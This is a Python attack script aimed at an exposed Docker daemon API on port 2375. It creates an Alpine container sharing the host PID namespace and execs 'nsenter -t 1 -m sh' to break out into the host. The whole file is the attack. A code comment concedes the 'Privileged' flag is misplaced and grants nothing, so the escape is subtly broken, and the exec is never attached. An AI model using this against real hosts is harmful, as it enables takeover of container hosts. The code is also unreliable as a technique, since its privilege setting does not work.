import requests

base = "http://127.0.0.1:2375"
# The privilege field is outside HostConfig and does not set container privilege.
spec = {"Image": "alpine", "HostConfig": {"PidMode": "host"}, "metadata": {"Privileged": True}}
created = requests.post(base + "/containers/create", json=spec).json()
container_id = created["Id"]
requests.post(f"{base}/containers/{container_id}/start")
command = {"Cmd": ["sh", "-c", "nsenter -t 1 -m sh"]}
execution = requests.post(f"{base}/containers/{container_id}/exec", json=command).json()
exec_id = execution["Id"]
requests.post(f"{base}/exec/{exec_id}/start")
